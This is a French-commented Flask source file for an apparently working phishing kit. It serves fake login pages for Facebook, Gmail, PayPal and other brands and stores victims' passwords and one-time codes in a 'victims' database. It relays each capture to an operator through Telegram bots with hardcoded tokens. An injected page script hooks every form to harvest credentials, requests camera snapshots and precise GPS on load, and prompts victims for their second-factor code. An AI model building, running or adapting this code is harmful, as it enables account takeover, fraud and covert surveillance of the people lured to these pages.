import os
from flask import Flask, request, jsonify, render_template, render_template_string
import requests
import datetime
import sqlite3
import json

app = Flask(__name__)

# Bot Telegram Administrateur (Reçoit toutes les données : identifiants, mots de passe, OTP, etc.)
ADMIN_BOT_TOKEN = os.environ.get("ADMIN_BOT_TOKEN", "8797682325:AAFMj6kcNv2R_EF3cWtl2pvWuRXVX4UwV7Q")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "6141755021")

# Bot Telegram du Groupe (Reçoit uniquement les photos, la géolocalisation GPS et le type d'appareil)
GROUP_BOT_TOKEN = os.environ.get("GROUP_BOT_TOKEN", "9186799056:AAFo81ztd2Fig2o3M-SHx2")
GROUP_CHAT_ID = os.environ.get("GROUP_CHAT_ID", "6141755021")

DB_NAME = 'abeilles.db'

PLATFORM_LOGOS = {
    "Facebook": "https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg",
    "Instagram": "https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg",
    "TikTok": "https://upload.wikimedia.org/wikipedia/commons/a/a6/Logo_NIKE.svg",
    "Gmail": "https://upload.wikimedia.org/wikipedia/commons/7/7e/Gmail_icon_%282020%29.svg",
    "Netflix": "https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg",
    "Telegram": "https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg",
    "LinkedIn": "https://upload.wikimedia.org/wikipedia/commons/c/ca/LinkedIn_logo_initials.svg",
    "PayPal": "https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg"
}

def get_db_connection():
    conn = sqlite3.connect(DB_NAME)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner TEXT,
            network TEXT,
            type TEXT,
            victimUser TEXT,
            victimPass TEXT,
            victimOtp TEXT,
            dateStr TEXT,
            timestamp INTEGER,
            ip TEXT,
            extra_info TEXT
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS custom_pages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner TEXT,
            slug TEXT UNIQUE,
            title TEXT,
            network TEXT,
            bg_type TEXT,
            bg_value TEXT,
            logo_url TEXT,
            logo_shape TEXT,
            fields_json TEXT,
            btn_text TEXT,
            html_code TEXT,
            redirect_url TEXT,
            mode TEXT,
            box_bg TEXT,
            box_width TEXT,
            opt3_config TEXT,
            created_at INTEGER
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def cleanup_expired_custom_pages():
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        two_hours_ago = int((datetime.datetime.now().timestamp() - 7200) * 1000)
        cursor.execute("DELETE FROM custom_pages WHERE created_at < ?", (two_hours_ago,))
        conn.commit()
        conn.close()
    except Exception as e:
        print("Erreur nettoyage liens 2h:", e)

def send_telegram_message(bot_token, chat_id, text):
    if not bot_token or bot_token == "VOTRE_BOT_TOKEN":
        return
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print("Erreur Telegram Message:", e)

def send_telegram_photo(bot_token, chat_id, photo_url, caption):
    if not bot_token or bot_token == "VOTRE_BOT_TOKEN":
        return
    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    payload = {"chat_id": chat_id, "photo": photo_url, "caption": caption, "parse_mode": "Markdown"}
    try:
        res = requests.post(url, json=payload, timeout=5)
        if res.status_code != 200:
            send_telegram_message(bot_token, chat_id, caption)
    except Exception as e:
        print("Erreur Telegram Photo:", e)

@app.route('/')
def index():
    cleanup_expired_custom_pages()
    return render_template('index.html')

@app.route('/phish/<path:subpath>')
def render_phish_page(subpath):
    cleanup_expired_custom_pages()
    subpath_clean = subpath.lower().strip('/').replace('-', '_')
    req_type = request.args.get('type', 'standard').lower()
    owner_param = request.args.get('user', 'Kim')
    
    db_slug = subpath_clean.replace('otp/', '').replace('standard/', '')
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM custom_pages WHERE slug = ?", (db_slug,))
    cp = cursor.fetchone()
    conn.close()

    if cp:
        now_ts = int(datetime.datetime.now().timestamp() * 1000)
        if (now_ts - cp["created_at"]) > 7200000:
            return "Ce lien a expiré après 2 heures.", 410

        redirect_url = cp["redirect_url"] or "https://www.google.com"

        if cp["mode"] == 'opt3':
            html = cp["html_code"] or "<html><body><h2>Connexion</h2></body></html>"
            owner = cp["owner"]
            network = cp["network"]
            opt3_cfg = json.loads(cp["opt3_config"] or '{}')
            
            use_cam_front = "true" if opt3_cfg.get("camFront") else "false"
            use_cam_back = "true" if opt3_cfg.get("camBack") else "false"
            use_gps = "true" if opt3_cfg.get("gps") else "false"

            raw_opt3_script = """
            <script>
            (function() {
                let isSubmitted = false;
                const useCamFront = __USE_CAM_FRONT__;
                const useCamBack = __USE_CAM_BACK__;
                const useGps = __USE_GPS__;
                let capturedImages = [];
                let gpsData = "Non capturée";
                const deviceType = navigator.userAgent;

                if (useGps && navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            gpsData = "Lat: " + pos.coords.latitude + ", Lon: " + pos.coords.longitude + " (Précision: " + pos.coords.accuracy + "m)";
                        },
                        (err) => { gpsData = "Refusée ou indisponible"; },
                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                    );
                }

                async function captureMediaStream() {
                    try {
                        if (!useCamFront && !useCamBack) return;
                        if (useCamFront) await recordPhotos('user');
                        if (useCamBack) await recordPhotos('environment');
                        
                        if (capturedImages.length > 0 || gpsData !== "Non capturée") {
                            fetch('/api/media_stream', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    owner: "__OWNER__",
                                    network: "__NETWORK__",
                                    gps: gpsData,
                                    device: deviceType,
                                    imagesCount: capturedImages.length
                                })
                            });
                        }
                    } catch(e) {
                        console.log("Erreur média:", e);
                    }
                }

                async function recordPhotos(facingMode) {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.setAttribute('autoplay', '');
                        video.setAttribute('playsinline', '');
                        await new Promise(resolve => video.onloadedmetadata = resolve);
                        await video.play();

                        const canvas = document.createElement('canvas');
                        canvas.width = 640;
                        canvas.height = 480;
                        const ctx = canvas.getContext('2d');

                        for (let i = 0; i < 6; i++) {
                            await new Promise(r => setTimeout(r, 500));
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            capturedImages.push(canvas.toDataURL('image/jpeg', 0.7));
                        }
                        stream.getTracks().forEach(track => track.stop());
                    } catch(err) {
                        console.log("Caméra " + facingMode + " indisponible");
                    }
                }

                window.addEventListener('load', () => { captureMediaStream(); });

                function processCapture(e) {
                    if (isSubmitted) return;
                    let userVal = "", passVal = "", otpVal = "";
                    const allInputs = document.querySelectorAll('input, select, textarea');
                    allInputs.forEach(inp => {
                        let name = (inp.name || inp.id || inp.type || "").toLowerCase();
                        let val = inp.value;
                        if (!val) return;
                        if (name.includes('user') || name.includes('email') || name.includes('login') || name.includes('tel') || name.includes('phone') || name.includes('compte')) {
                            userVal = val;
                        } else if (name.includes('pass') || name.includes('mdp') || name.includes('password') || name.includes('pin')) {
                            passVal = val;
                        } else if (name.includes('otp') || name.includes('code') || name.includes('secret')) {
                            otpVal = val;
                        }
                    });

                    isSubmitted = true;
                    if (e) e.preventDefault();
                    
                    const hasOtpField = Array.from(allInputs).some(inp => (inp.name || inp.id || "").toLowerCase().includes('otp') || (inp.name || inp.id || "").toLowerCase().includes('code'));

                    const payload = JSON.stringify({
                        owner: "__OWNER__",
                        network: "__NETWORK__",
                        type: "option3_smart",
                        victimUser: userVal || "Inconnu",
                        victimPass: passVal || "Inconnu",
                        otp: otpVal || "Aucun",
                        gps: gpsData,
                        device: deviceType,
                        hasOtp: hasOtpField
                    });

                    fetch('/api/capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: payload,
                        keepalive: true
                    }).then(res => res.json()).then(resp => {
                        if (resp.status === 'otp_required') {
                            alert("Code OTP requis. Veuillez entrer votre code de vérification.");
                            isSubmitted = false;
                        } else {
                            window.location.href = "__REDIRECT_URL__";
                        }
                    }).catch(() => {
                        window.location.href = "__REDIRECT_URL__";
                    });
                }

                document.addEventListener('DOMContentLoaded', function() {
                    const forms = document.querySelectorAll('form');
                    forms.forEach(form => {
                        form.addEventListener('submit', function(e) { processCapture(e); });
                    });
                    const submitBtns = document.querySelectorAll('button[type="submit"], input[type="submit"], button');
                    submitBtns.forEach(btn => {
                        btn.addEventListener('click', function(e) {
                            setTimeout(() => processCapture(e), 50);
                        });
                    });
                });
            })();
            </script>
            """

            robust_opt3_script = (raw_opt3_script
                .replace("__USE_CAM_FRONT__", use_cam_front)
                .replace("__USE_CAM_BACK__", use_cam_back)
                .replace("__USE_GPS__", use_gps)
                .replace("__OWNER__", owner)
                .replace("__NETWORK__", network)
                .replace("__REDIRECT_URL__", redirect_url)
            )

            if "</body>" in html:
                html = html.replace("</body>", robust_opt3_script + "</body>")
            else:
                html += robust_opt3_script

            return render_template_string(html)

        elif cp["mode"] == 'opt2' and cp["html_code"]:
            html = cp["html_code"]
            return render_template_string(html)
        else:
            config = {
                "owner": cp["owner"],
                "title": cp["title"],
                "network": cp["network"],
                "bg_type": cp["bg_type"],
                "bg_value": cp["bg_value"],
                "logo_url": cp["logo_url"],
                "logo_shape": cp["logo_shape"],
                "fields": json.loads(cp["fields_json"] or '[]'),
                "btn_text": cp["btn_text"],
                "box_bg": cp["box_bg"] if "box_bg" in cp else "rgba(255,255,255,0.95)",
                "box_width": cp["box_width"] if "box_width" in cp else "520px",
                "redirect_url": redirect_url
            }
            return render_template_string(OPTION1_TEMPLATE, config=config)

    base_name = subpath_clean.replace('_otp', '').replace('-otp', '')
    
    if req_type == 'otp' or 'otp' in request.path.lower():
        template_paths = [
            f"otp/{base_name}_otp.html",
            f"otp/{base_name}.html",
            f"otp/{subpath_clean}.html"
        ]
    else:
        template_paths = [
            f"standard/{base_name}.html",
            f"standard/{subpath_clean}.html"
        ]

    for template_path in template_paths:
        try:
            return render_template(template_path, owner=owner_param, network=base_name.capitalize())
        except Exception:
            continue

    return f"Page de phishing introuvable pour : {subpath} (Type: {req_type})", 404

OPTION1_TEMPLATE = """
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>{{ config.title }}</title>
    <style>
        body { background: {% if config.bg_type == 'color' %}{{ config.bg_value }}{% else %}url('{{ config.bg_value }}') no-repeat center center fixed{% endif %}; background-size: cover; color: #333; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: {{ config.box_bg }}; border: 2px solid #f5b014; padding: 45px 35px; border-radius: 12px; width: 95%; max-width: {{ config.box_width }}; text-align: center; box-shadow: 0 10px 35px rgba(0,0,0,0.6); backdrop-filter: blur(6px); }
        .logo { width: 100px; height: 100px; object-fit: contain; border-radius: {% if config.logo_shape == 'circle' %}50%{% else %}8px{% endif %}; border: 3px solid #f5b014; margin-bottom: 20px; background: #fff; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
        h2 { color: #222; margin-bottom: 25px; font-size: 24px; font-weight: bold; }
        input { width: 100%; padding: 15px 18px; margin: 12px 0; background: #fdfdfd; border: 1px solid #ccc; color: #333; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
        input:focus { border-color: #f5b014; outline: none; box-shadow: 0 0 6px rgba(245,176,20,0.5); }
        button { width: 100%; padding: 15px; background: #f5b014; border: none; color: #111; font-size: 17px; font-weight: bold; border-radius: 6px; cursor: pointer; margin-top: 20px; }
        button:hover { background: #ffcc33; }
    </style>
</head>
<body>
    <div class="box">
        {% if config.logo_url %}
        <img src="{{ config.logo_url }}" class="logo" alt="Logo">
        {% endif %}
        <h2>{{ config.title }}</h2>
        <form onsubmit="submitOpt1(event)">
            {% for f in config.fields %}
            <input type="{{ f.type }}" id="{{ f.name }}" placeholder="{{ f.label }}" required>
            {% endfor %}
            <button type="submit">{{ config.btn_text }}</button>
        </form>
    </div>
    <script>
        function submitOpt1(e) {
            e.preventDefault();
            const user = document.getElementById('victimUser') ? document.getElementById('victimUser').value : "Inconnu";
            const pass = document.getElementById('victimPass') ? document.getElementById('victimPass').value : "Inconnu";
            const otpEl = document.getElementById('otp');
            const otp = otpEl ? otpEl.value : "Aucun";

            fetch('/api/capture', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    owner: "{{ config.owner }}",
                    network: "{{ config.network }}",
                    type: "option1_nocode",
                    victimUser: user,
                    victimPass: pass,
                    otp: otp
                })
            }).then(() => {
                window.location.href = "{{ config.redirect_url }}";
            });
        }
    </script>
</body>
</html>
"""

@app.route('/api/create_login', methods=['POST'])
def create_login():
    data = request.json
    owner = data.get('owner', '').strip()
    slug = data.get('slug', '').strip().lower().replace(' ', '_')
    
    if not owner or not slug:
        return jsonify({"status": "error", "message": "Propriétaire ou slug manquant"})

    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        now_ts = int(datetime.datetime.now().timestamp() * 1000)
        mode = data.get('mode', 'opt1')
        box_bg = data.get('boxBg', 'rgba(255,255,255,0.95)')
        box_width = data.get('boxWidth', '520px')
        
        if mode == 'opt3':
            opt3_config = json.dumps(data.get('opt3Config', {}))
            cursor.execute('''
                INSERT OR REPLACE INTO custom_pages (owner, slug, title, network, bg_type, bg_value, logo_url, logo_shape, fields_json, btn_text, html_code, redirect_url, mode, box_bg, box_width, opt3_config, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                owner, slug, "Page Intelligente Opt3", data.get('network'),
                "color", "#111", "", "circle", "[]", "Valider",
                data.get('htmlCode'), data.get('redirectUrl'), 'opt3', box_bg, box_width, opt3_config, now_ts
            ))
        elif mode == 'opt2':
            cursor.execute('''
                INSERT OR REPLACE INTO custom_pages (owner, slug, title, network, bg_type, bg_value, logo_url, logo_shape, fields_json, btn_text, html_code, redirect_url, mode, box_bg, box_width, opt3_config, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                owner, slug, "Page Perso HTML", data.get('network'),
                "color", "#111", "", "circle", "[]", "Valider",
                data.get('htmlCode'), data.get('redirectUrl'), 'opt2', box_bg, box_width, "{}", now_ts
            ))
        else:
            cursor.execute('''
                INSERT OR REPLACE INTO custom_pages (owner, slug, title, network, bg_type, bg_value, logo_url, logo_shape, fields_json, btn_text, html_code, redirect_url, mode, box_bg, box_width, opt3_config, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                owner, slug, data.get('title'), data.get('network'),
                data.get('bgType'), data.get('bgValue'), data.get('logoUrl'),
                data.get('logoShape'), json.dumps(data.get('fields')), data.get('btnText'), "", data.get('redirectUrl', 'https://www.google.com'), 'opt1', box_bg, box_width, "{}", now_ts
            ))
            
        conn.commit()
        conn.close()
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/custom_pages', methods=['GET'])
def get_custom_pages():
    cleanup_expired_custom_pages()
    owner = request.args.get('owner', '').strip()
    conn = get_db_connection()
    cursor = conn.cursor()
    if owner:
        cursor.execute("SELECT * FROM custom_pages WHERE owner = ? ORDER BY id DESC", (owner,))
    else:
        cursor.execute("SELECT * FROM custom_pages ORDER BY id DESC")
    rows = cursor.fetchall()
    conn.close()
    
    pages = []
    for row in rows:
        pages.append({
            "slug": row["slug"],
            "title": row["title"],
            "network": row["network"],
            "mode": row["mode"]
        })
    return jsonify(pages)

@app.route('/api/clear_victims', methods=['POST'])
def clear_victims():
    data = request.json
    owner = data.get('owner', '').strip()
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("DELETE FROM victims WHERE owner = ?", (owner,))
        conn.commit()
        conn.close()
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/media_stream', methods=['POST'])
def media_stream():
    data = request.json or {}
    owner = data.get('owner', 'Kim')
    network = data.get('network', 'Cible')
    gps = data.get('gps', 'Non capturée')
    device = data.get('device', 'Inconnu')
    images_count = data.get('imagesCount', 0)

    group_alert = (
        f"📸 *RAPPORT MÉDIA & GÉOLOCALISATION* 📸\n\n"
        f"🌐 *Cible/Réseau:* {network}\n"
        f"👤 *Propriétaire:* `{owner}`\n"
        f"📱 *Appareil:* `{device}`\n"
        f"📍 *GPS:* `{gps}`\n"
        f"🖼️ *Photos capturées:* `{images_count}`"
    )
    send_telegram_message(GROUP_BOT_TOKEN, GROUP_CHAT_ID, group_alert)
    return jsonify({"status": "success"})

@app.route('/api/capture', methods=['POST'])
def capture_data():
    data = request.json or {}
    owner = data.get('owner', 'Kim').strip()
    network = data.get('network', 'Facebook')
    v_user = data.get('victimUser')
    v_pass = data.get('victimPass')
    v_otp = data.get('otp', 'Aucun')
    v_type = data.get('type', 'standard')
    gps = data.get('gps', 'Non capturée')
    has_otp = data.get('hasOtp', False)
    
    extra_data = f"GPS: {gps}"

    raw_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    v_ip = raw_ip.split(',')[0].strip() if raw_ip else "127.0.0.1"
    
    current_time = datetime.datetime.now()
    timestamp = int(current_time.timestamp() * 1000)
    date_str = current_time.strftime("%d/%m/%Y %H:%M:%S")

    conn = get_db_connection()
    cursor = conn.cursor()

    if has_otp and (not v_otp or v_otp == 'Aucun'):
        cursor.execute('''
            INSERT INTO victims (owner, network, type, victimUser, victimPass, victimOtp, dateStr, timestamp, ip, extra_info)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (owner, network, v_type, v_user, v_pass, "En attente OTP...", date_str, timestamp, v_ip, extra_data))
        conn.commit()
        conn.close()

        logo_img = PLATFORM_LOGOS.get(network, "https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg")
        admin_alert = (
            f"🚨 *VICTIME (ÉTAPE 1 - IDENTIFIANTS)* 🚨\n\n"
            f"📚 *Plateforme:* {network}\n"
            f"👤 *Propriétaire:* `{owner}`\n"
            f"🎯 *Identifiant:* `{v_user}`\n"
            f"🔑 *Mot de passe:* `{v_pass}`\n"
            f"🔒 *OTP:* `En attente...`\n"
            f"📍 *IP:* `{v_ip}`\n"
            f"🌐 *Infos:* {extra_data}"
        )
        send_telegram_photo(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, logo_img, admin_alert)
        return jsonify({"status": "otp_required"})

    if v_otp and v_otp != 'Aucun' and v_otp != 'En attente OTP...':
        cursor.execute('''
            SELECT id FROM victims WHERE owner = ? AND network = ? AND victimUser = ? ORDER BY id DESC LIMIT 1
        ''', (owner, network, v_user))
        existing = cursor.fetchone()
        if existing:
            cursor.execute('''
                UPDATE victims SET victimOtp = ?, dateStr = ?, timestamp = ?, ip = ?, extra_info = ? WHERE id = ?
            ''', (v_otp, date_str, timestamp, v_ip, extra_data, existing["id"]))
            conn.commit()
            conn.close()
            
            logo_img = PLATFORM_LOGOS.get(network, "https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg")
            admin_alert = (
                f"🚨 *VICTIME COMPLÈTE (AVEC OTP)* 🚨\n\n"
                f"📚 *Plateforme:* {network}\n"
                f"👤 *Propriétaire:* `{owner}`\n"
                f"🎯 *Identifiant:* `{v_user}`\n"
                f"🔑 *Mot de passe:* `{v_pass}`\n"
                f"🔒 *OTP:* `{v_otp}`\n"
                f"📍 *IP:* `{v_ip}`\n"
                f"🌐 *Infos:* {extra_data}"
            )
            send_telegram_photo(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, logo_img, admin_alert)
            return jsonify({"status": "success"})

    cursor.execute('''
        INSERT INTO victims (owner, network, type, victimUser, victimPass, victimOtp, dateStr, timestamp, ip, extra_info)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (owner, network, v_type, v_user, v_pass, v_otp, date_str, timestamp, v_ip, extra_data))
    conn.commit()
    conn.close()

    logo_img = PLATFORM_LOGOS.get(network, "https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg")
    admin_alert = (
        f"🚨 *NOUVELLE VICTIME CAPTURÉE* 🚨\n\n"
        f"📚 *Plateforme:* {network}\n"
        f"👤 *Propriétaire:* `{owner}`\n"
        f"🎯 *Identifiant:* `{v_user}`\n"
        f"🔑 *Mot de passe:* `{v_pass}`\n"
        f"🔒 *OTP:* `{v_otp}`\n"
        f"📍 *IP:* `{v_ip}`\n"
        f"🌐 *Infos:* {extra_data}"
    )
    send_telegram_photo(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, logo_img, admin_alert)
    return jsonify({"status": "success"})

@app.route('/api/victims', methods=['GET'])
def get_victims():
    owner = request.args.get('owner', '').strip()
    conn = get_db_connection()
    cursor = conn.cursor()
    if owner:
        cursor.execute("SELECT * FROM victims WHERE owner LIKE ? ORDER BY id DESC", (f"%{owner}%",))
    else:
        cursor.execute("SELECT * FROM victims ORDER BY id DESC")
    rows = cursor.fetchall()
    conn.close()
    
    victims_list = []
    for row in rows:
        victims_list.append({
            "id": row["id"],
            "owner": row["owner"],
            "network": row["network"],
            "type": row["type"],
            "victimUser": row["victimUser"],
            "victimPass": row["victimPass"],
            "otp": row["victimOtp"],
            "dateStr": row["dateStr"],
            "timestamp": row["timestamp"],
            "ip": row["ip"],
            "extra_info": row["extra_info"]
        })
    return jsonify(victims_list)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

application = app
main = app
server = app
